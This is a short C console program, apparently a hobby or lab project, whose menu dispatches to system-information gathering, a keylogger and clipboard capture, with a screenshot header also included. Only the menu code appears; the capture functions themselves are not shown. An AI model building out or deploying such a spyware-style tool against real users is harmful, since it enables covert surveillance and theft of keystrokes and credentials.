#include "intel.h"
#include "keylogger.h"
#include "list.h"
#include "screenshot.h"
#include "clipboard.h"

int _tmain()
{
	while (1)
	{
		_tprintf(_T("MENU:\n 1. Intel\n 2. Keylogger\n 3. List\n 4. Clipboard\n 5. Quit\n\n"));

		TCHAR input[2];
		_tprintf(_T("User input: "));
		_getts_s(input, 2);
		_tprintf(_T("\n"));

		if (!strcmp(input, "1"))
		{
			getUserInfo();
			getMemoryUsage();
			getSystemInfo();
		}
		else if (!strcmp(input, "2"))
		{
			keylogger();
		}
		else if (!strcmp(input, "3"))
		{
			list();
		}
		else if (!strcmp(input, "4"))
		{
			clipboard();
		}
		else
		{
			exit(0);
		}
	}
}